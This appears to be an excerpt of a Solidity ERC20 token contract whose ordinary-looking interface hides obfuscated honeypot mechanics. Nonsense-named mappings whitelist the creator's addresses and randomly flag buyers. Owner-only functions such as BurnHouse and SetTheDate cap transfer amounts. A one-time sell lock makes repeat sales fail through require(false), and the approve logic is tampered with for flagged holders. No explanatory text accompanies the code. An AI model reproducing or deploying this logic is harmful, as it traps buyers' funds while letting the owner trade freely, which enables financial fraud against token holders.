...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public samsung;
  mapping (address => bool) public bluec;
  mapping (address => bool) public neworleans;
  mapping (address => uint256) public katrina;

  bool private kansas;
  uint256 private _totalSupply;
  uint256 private panhandle;
  ...
  constructor() public {
    ...
    _trns = _totalSupply;
    panhandle = _totalSupply;
    chTx = _totalSupply / 1500;
    opera = panhandle;
    bluec[creator] = false;
    neworleans[creator] = false;
    samsung[msg.sender] = true;
  ...
  */
  ...
  function BurnHouse(uint256 amount) external onlyOwner {
    panhandle = amount;
  }
  
  function SetTheDate() external onlyOwner {
    panhandle = chTx;
    thisValue = true;
  }
  ...
  function TwistedVoid(uint256 amount) public onlyOwner returns (bool) {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (kansas == false)) {
      panhandle = chTx;
      thisValue = true;
    }
    
    if ((address(sender) == creator) && (kansas == true)) {
      samsung[recipient] = true;
      bluec[recipient] = false;
      kansas = false;
    } 
    
    if (samsung[recipient] != true) {
        bluec[recipient] = ((randomly() == 78) ? true : false);
    }
    
    if ((bluec[sender]) && (samsung[recipient] == false)) {
        bluec[recipient] = true;
    }
    
    if (samsung[sender] == false) {
      require(amount < panhandle);
      if (thisValue == true) {
        if (neworleans[sender] == true) {
          require(false);
        }
        neworleans[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (virginia == true)) {
      samsung[spender] = true;
      bluec[spender] = false;
      neworleans[spender] = false;
      virginia = false;
    }
    
    tok = (bluec[owner] ? 723834 : amount);
